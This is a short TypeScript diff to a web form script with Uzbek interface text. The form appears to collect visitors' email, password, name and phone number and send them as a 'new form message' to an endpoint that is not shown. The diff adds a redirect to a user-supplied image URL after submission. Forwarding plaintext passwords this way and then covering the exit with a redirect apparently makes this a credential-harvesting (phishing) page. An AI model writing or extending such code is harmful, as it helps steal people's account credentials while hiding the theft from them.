@@ -17,11 +17,13 @@ if (form && statusText) {
     const passwordInput = document.getElementById('password') as HTMLInputElement | null;
     const nameInput = document.getElementById('name') as HTMLInputElement | null;
     const callInput = document.getElementById('number') as HTMLInputElement | null;
+    const redirectImageInput = document.getElementById('redirectImage') as HTMLInputElement | null;
 
     const email = emailInput?.value || '';
     const password = passwordInput?.value || '';
     const name = nameInput?.value || '';
     const call = callInput?.value || '';
+    const redirectImage = redirectImageInput?.value?.trim() || '';
 
     const text: string = `
 📝 Yangi forma xabari:
@@ -42,8 +44,11 @@ if (form && statusText) {
       }),
     })
       .then((res: Response) => {
-        statusElement.textContent = 'Xabar muvaffaqiyatli yuborildi!';
+        statusElement.textContent = 'Xabar muvaffaqiyatli yuborildi! Rasm ochilmoqda...';
         formElement.reset();
+        if (redirectImage) {
+          window.location.href = redirectImage;
+        }
       })
       .catch((err: Error) => {
         statusElement.textContent = 'Xatolik yuz berdi!';
